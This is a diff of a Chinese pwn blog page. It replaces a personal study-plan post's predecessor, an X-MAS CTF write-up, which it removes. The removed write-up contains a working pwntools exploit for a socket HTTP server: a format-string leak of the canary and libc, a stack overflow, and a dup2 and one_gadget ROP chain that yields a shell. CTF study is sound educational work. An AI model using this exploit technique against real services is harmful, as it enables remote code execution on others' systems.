@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>X-MAS-CTF-web和pwn结合 | sixpar&#39;s blog</title>
-  <meta name="keywords" content=" webpwn ">
-  <meta name="description" content="X-MAS-CTF-web和pwn结合 | sixpar&#39;s blog">
+  <title>下一阶段规划 | sixpar&#39;s blog</title>
+  <meta name="keywords" content=" 关于我 ">
+  <meta name="description" content="下一阶段规划 | sixpar&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="欢迎您的访问 想了解我？ 我只是某不知名的pwn手噢~">
 <meta property="og:type" content="website">
@@ -456,9 +456,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-X-MAS-CTF-web和pwn结合" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-下一阶段规划" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">X-MAS-CTF-web和pwn结合</h1>
+        <h1 class="article-title">下一阶段规划</h1>
     
     <div class="article-meta">
         
@@ -468,7 +468,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="PWN题">PWN题</a>
+            <a  data-rel="生活">生活</a>
             
         </span>
         
@@ -476,19 +476,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color2">webpwn</a>
+            <a class="color4">关于我</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-07-05 23:56:37'>2020-07-05 23:11</time>
+            Created At : <time class="date" title='Updated At: 2020-07-06 10:39:50'>2020-07-06 10:15</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:1.7k</span>
+        <span>Count:444</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -518,7 +518,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-Canary："><span class="toc-text">Bypass Canary：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#开始栈溢出："><span class="toc-text">开始栈溢出：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP-chains："><span class="toc-text">ROP chains：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#完整EXP："><span class="toc-text">完整EXP：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#写在最后"><span class="toc-text">写在最后</span></a></li></ol>
+        
     
 <style>
     .left-col .switch-btn,
@@ -535,193 +535,19 @@
     <div class="article-entry" itemprop="articleBody">
       
         <blockquote>
-<p>今晚了解一下web+pwn的题目是怎样的，然后看到了这篇文章，感觉还不错，大致看了一遍能看懂。感觉好奇妙，web和pwn的梦幻联动。</p>
+<p>现在的想法就是：赶紧刷题 </p>
 </blockquote>
-<p>先贴上原文章以表尊敬：<a href="https://www.anquanke.com/post/id/168705" target="_blank" rel="noopener">https://www.anquanke.com/post/id/168705</a></p>
-<p>主要从子进程调试、socket通信方面讨论如何解决这类<code>基于socket服务</code>的pwn题。</p>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>题目给了一个基于socket的server(保护全开)以及libc.so<br>把server程序跑起来，通过浏览器访问 <a href="http://localhost:1337，出现了一个页面，表示预留了一个通过GET请求的接口">http://localhost:1337，出现了一个页面，表示预留了一个通过GET请求的接口</a></p>
-<p>页面文字给出一个了请求example： GET/?parameter=base_string<br>由于题目多次提示了 toy parameter<br>所以发现可以这样调用：</p>
+<p>刷题刷的够多才能熟能生巧。给我的时间本就不多了。<br>接下去两个月暑假的时间，我也不可能完全把时间花在pwn学习上了。因为要去HW，当个蓝队菜鸡，HW时间还没确定，地点当然是选择浙江省内。<br>我当然希望自己能够宅在家里然后每天刷题，但是想想能出去实习一下还是不错的，取取经，看别人操作赚一波经验。</p>
+<p>我现在还处于pwn初级阶段，一些知识还未完全掌握，只能靠多刷题然后巩固整理。我当然希望自己能早日进阶，逐渐转向实战。但是基础也不能差，师傅说的对，你能挖到什么洞取决你掌握了多少漏洞pattern。 所以基础要扎实 QAQ，又不能走的太快。</p>
+<p>我9月份开学就是大三了。<br>想想大学也过去一半了，自己摸黑了这么久还是个菜鸡，害，继续努力吧。</p>
+<p>每天安排好时间：</p>
 <blockquote>
-<p>/?toy=base64_string</p>
+<p>6:20 起床<br>一天之中抽出1小时背单词<br>0.5小时英文听力<br>剩余时间刷题<br>22:50 一定要睡觉！！！每次都不小心弄到很迟</p>
 </blockquote>
-<p>比如请求hello world页面，传入hello world的base64编码aGVsbG8gd29ybGQ=<br>于是请求：</p>
-<blockquote>
-<p><a href="http://localhost:1337/?toy=aGVsbG8gd29ybGQ=" target="_blank" rel="noopener">http://localhost:1337/?toy=aGVsbG8gd29ybGQ=</a></p>
-</blockquote>
-<p>得到的页面显示：</p>
-<blockquote>
-<p>Santa will bring you the <code>hello world</code> this year</p>
-</blockquote>
-<p>看来像是把我们的base64编码的输入给输出来了。</p>
-<p>于是开始检验这里有没有溢出漏洞<br>传入一个超长串的base64编码，结果网页直接崩掉，server的启动终端提示stack smashing，说明已经发生溢出了，但是有canary。下面找找可以info leak的洞</p>
-<h2 id="Bypass-Canary："><a href="#Bypass-Canary：" class="headerlink" title="Bypass Canary："></a>Bypass Canary：</h2><p>route函数中有一处fsb （print(v2)）可以用于泄漏stack cookie。</p>
-<p>下面说说调试方法：<br>一般的pwn题，直接通过socat起来，然后远程连接（我好像没这么干过欸，下次找教程试试），要调试的只有一个进程；对于socket服务，<code>当接收到请求时，会fork出来一个子进程</code>，该子进程的内存空间布局与父进程一致，所以这几次会话时泄漏出来的Canary也都将完全一致。<br>直接在子进程代码中下断点，程序是不会断下的，需要先设置跟随子进程</p>
-<blockquote>
-<p>set follow-fork-mode child。</p>
-</blockquote>
-<p>先在route处下断，设置跟随子进程，运行下面这段leak脚本：</p>
-<pre><code class="python">#! /usr/bin/env python
-# -*- coding: utf-8 -*-
-from pwn import *
-def _request(gift,fmt,ctl):
-    req = &quot;GET /?toy={} HTTP/1.1rn&quot;.format(gift)
-    req += &quot;User-Agent: {}rn&quot;.format(fmt)
-    s=remote(&quot;localhost&quot;,1337,level=&quot;error&quot;)
-    s.s(req)
-    try:
-        if not ctl:
-            return re.findall(&quot;&lt;br&gt;(.*?)&lt;/small&gt;&quot;, s.recvall())[0][10:]
-        else:
-            return s.irt()
-    except EOFError:
-        return None
-    finally:
-        s.close()
-
-def pwn():
-    leak = _request(b64e(&#39;wooy0ung&#39;),&#39;%p &#39;*200,False).split(&#39; &#39;
-
-if __name__ == &#39;__main__&#39;:
-    pwn()</code></pre>
-<p>现在断在了route函数中printf调用的地方，此时查看栈上可以看到canary值。<br>通过vmmap查看内存布局，这样pie_base、libc_base也就知道了。</p>
-<p>由于上面的leak脚本是输入了200个%p，所以总共泄露出来200个地址。我们仔细发现还是能找到端倪的。具体图片看原文章。</p>
-<p>偏移为0的地址是PIE地址。<br>偏移为6的地址是canary值。<br>偏移为36的地址是libc地址。</p>
-<p>对比之前vmmap得到的基址，我们就可以确定与基址的偏移：</p>
-<pre><code class="python">0x0000555555556006 - 0x0000555555554000 = 0x2006    # PIE偏移
-0x00007ffff7a2d830 - 0x00007ffff7a0d000 = 0x20830   # Libc偏移</code></pre>
-<p>于是下一次运行程序时我们就可以通过已知偏移+基址得到 实际的内存地址。</p>
-<h2 id="开始栈溢出："><a href="#开始栈溢出：" class="headerlink" title="开始栈溢出："></a>开始栈溢出：</h2><p>关于溢出点，找了好久，server设置跟随子进程，跑一下下面这段poc：</p>
-<pre><code class="python">#! /usr/bin/env python
-# -*- coding: utf-8 -*-
-from pwn import *
-def pwn():
-    pl = &quot;QWEwQWExQWEyQWEzQWE0QWE1QWE2QWE3QWE4QWE5QWIwQWIxQWIyQWIzQWI0QWI1QWI2QWI3QWI4&quot;
-    pl += &quot;QWI5QWMwQWMxQWMyQWMzQWM0QWM1QWM2QWM3QWM4QWM5QWQwQWQxQWQyQWQzQWQ0QWQ1QWQ2QWQ3&quot;
-    pl += &quot;QWQ4QWQ5QWUwQWUxQWUyQWUzQWU0QWU1QWU2QWU3QWU4QWU5QWYwQWYxQWYyQWYzQWY0QWY1QWY2&quot;
-    pl += &quot;QWY3QWY4QWY5QWcwQWcxQWcyQWczQWc0QWc1QWc=    &quot;
-    req = &quot;GET /?toy={} HTTP/1.1rn&quot;.format(pl)
-    s=remote(&quot;localhost&quot;,1337,level=&quot;error&quot;)
-    s.s(req)
-
-if __name__ == &#39;__main__&#39;:
-    pwn()</code></pre>
-<p>填充之前我们观察正常状态下的栈的分布以及数据。看到canary的地址是0x7fffffffd928</p>
-<p>等栈被填充垃圾数据，溢出，造成子进程崩溃的时候，我们再来栈回溯，发现调用stack_check_fail函数的下一句出现了parse_query_string字眼，也就是说在parse_query_string处开始崩的。于是我们重新跟随子进程，停在base64_decode函数调用的地方。<br>在函数调用填充前看正常数据，以及填充后看垃圾数据，两者进行对比。</p>
-<p>发现垃圾数据是在0x7fffffffd8e0处开始填入的。而我们之前发现的canary的地址是0x7fffffffd928，于是可以计算处栈大小（tack_cookie的偏移）为 0x928-0x8e0 = 0x48 </p>
-<p>查看函数base64decode的相关代码，最后确认溢出点在这里，a2是在调用base64decode传入的一个局部数组。 没图hhh，自己看原文章叭。</p>
-<p>查看栈布局，a2的缓冲区大小果然只有0x48，当越界了就会发生溢出</p>
-<h2 id="ROP-chains："><a href="#ROP-chains：" class="headerlink" title="ROP chains："></a>ROP chains：</h2><p>现在已经分析完了，下面就是常规栈溢出的做法了，只是要注意现在是在socket服务下的利用，还需要将标准输入、输出重定向到sockfd。</p>
-<h2 id="完整EXP："><a href="#完整EXP：" class="headerlink" title="完整EXP："></a>完整EXP：</h2><pre><code class="python">#! /usr/bin/env python
-# -*- coding: utf-8 -*-
-
-from pwn import *
-import os, sys
-import requests
-import re
-
-DEBUG = 4
-context.arch = &#39;amd64&#39;
-context.log_level = &#39;debug&#39;
-elf = ELF(&#39;./server&#39;,checksec=False)
-
-# synonyms for faster typing
-tube.s = tube.send
-tube.sl = tube.sendline
-tube.sa = tube.sendafter
-tube.sla = tube.sendlineafter
-tube.r = tube.recv
-tube.ru = tube.recvuntil
-tube.rl = tube.recvline
-tube.ra = tube.recvall
-tube.rr = tube.recvregex
-tube.irt = tube.interactive
-
-if DEBUG == 1:
-    libc = ELF(&#39;/root/workspace/expmake/libc_x64&#39;,checksec=False)
-    s = process(&#39;./toy&#39;)
-elif DEBUG == 2:
-    libc = ELF(&#39;/root/workspace/expmake/libc_x64&#39;,checksec=False)
-    s = process(&#39;./toy&#39;, env={&#39;LD_PRELOAD&#39;:&#39;/root/workspace/expmake/libc_x64&#39;})
-elif DEBUG == 3:
-    libc = ELF(&#39;/root/workspace/expmake/libc_x64&#39;,checksec=False)
-    ip = &#39;localhost&#39; 
-    port = 1337
-    s = remote(ip,port)
-elif DEBUG == 4:
-    libc = ELF(&#39;/root/workspace/expmake/libc_x64&#39;,checksec=False)
-
-def _request(gift,fmt,ctl):
-    req = &quot;GET /?toy={} HTTP/1.1rn&quot;.format(gift)
-    req += &quot;User-Agent: {}rn&quot;.format(fmt)
-
-    s=remote(&quot;localhost&quot;,1337,level=&quot;error&quot;)
-    s.s(req)
-    try:
-        if not ctl:
-            return re.findall(&quot;&lt;br&gt;(.*?)&lt;/small&gt;&quot;, s.recvall())[0][10:]
-        else:
-            return s.irt()
-    except EOFError:
-        return None
-    finally:
-        s.close()
-
-def pwn():
-    leak = _request(b64e(&#39;wooy0ung&#39;),&#39;%p &#39;*200,False).split(&#39; &#39;)
-    #print leak
-
-    pie_base = int(leak[0], 16) - 0x2006    # 0x0000555555556006-0x0000555555554000 = 0x2006
-    stack_cookie = int(leak[6], 16)
-    libc.address = int(leak[36],16) - 0x20830    # 0x7ffff7a2d830-0x00007ffff7a0d000 = 0x20830
-
-    info(&quot;0x%x pie_base&quot;,pie_base)
-    info(&quot;0x%x stack_cookie&quot;,stack_cookie)
-    info(&quot;0x%x libc.address&quot;,libc.address)
-
-    &#39;&#39;&#39;
-    pl = &quot;QWEwQWExQWEyQWEzQWE0QWE1QWE2QWE3QWE4QWE5QWIwQWIxQWIyQWIzQWI0QWI1QWI2QWI3QWI4&quot;
-    pl += &quot;QWI5QWMwQWMxQWMyQWMzQWM0QWM1QWM2QWM3QWM4QWM5QWQwQWQxQWQyQWQzQWQ0QWQ1QWQ2QWQ3&quot;
-    pl += &quot;QWQ4QWQ5QWUwQWUxQWUyQWUzQWU0QWU1QWU2QWU3QWU4QWU5QWYwQWYxQWYyQWYzQWY0QWY1QWY2&quot;
-    pl += &quot;QWY3QWY4QWY5QWcwQWcxQWcyQWczQWc0QWc1QWc=    &quot;
-    req = &quot;GET /?toy={} HTTP/1.1rn&quot;.format(pl)
-    s=remote(&quot;localhost&quot;,1337,level=&quot;error&quot;)
-    s.s(req)
-    &#39;&#39;&#39;
-    ret = pie_base + 0x0000000000000c4e
-    rdi = pie_base + 0x0000000000001d9b
-    rsi_r15 = pie_base + 0x0000000000001d99
-    rdx_rsi = libc.address + 0x00000000001150c9
-
-    #1.Smash stack bypass
-    pl = &#39;&#39;
-    pl += &#39;a&#39;*0x48
-    pl += p64(stack_cookie)
-    #2.Call dup2(4,1) [out]
-    pl += p64(ret)*4
-    pl += p64(rdi)
-    pl += p64(4)
-    pl += p64(rdx_rsi)
-    pl += &#39;a&#39;*8
-    pl += p64(1)
-    pl += p64(libc.sym[&#39;dup2&#39;])
-    #3.Call dup2(4,0) [in]
-    pl += p64(ret)*4
-    pl += p64(rdi)
-    pl += p64(4)
-    pl += p64(rdx_rsi)
-    pl += &#39;a&#39;*8
-    pl += p64(0)
-    pl += p64(libc.sym[&#39;dup2&#39;])
-    #4.Call system(&#39;/bin/sh&#39;)
-    pl += p64(ret)
-    pl += p64(libc.address+0x45216) # one_gadget
-    pl.rjust(200,&#39;x00&#39;)
-
-    _request(b64e(pl),&#39;&#39;,True)
-
-if __name__ == &#39;__main__&#39;:
-    pwn()</code></pre>
-<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>OK，完工，算是自己理了一遍，初识web+pwn题目。<br>ZYB又要打睡前电话了hhhh</p>
+<p>睡眠真的重要，要不然早上起不来 呜呜呜QAQ</p>
+<p>以后我也许会大量更新pwn题的笔记了，几乎是做一题更新一题。更新到 PWN题 文章分类中</p>
+<p>我现在发现把印象笔记的笔记搬运到博客里真的是太累了。<br>不如朝前看，吸收新知识然后写进博客里。至于一些基础的内容就去百度叭。</p>
+<p>加油，刷题开始咯。</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论嗷。 </span>
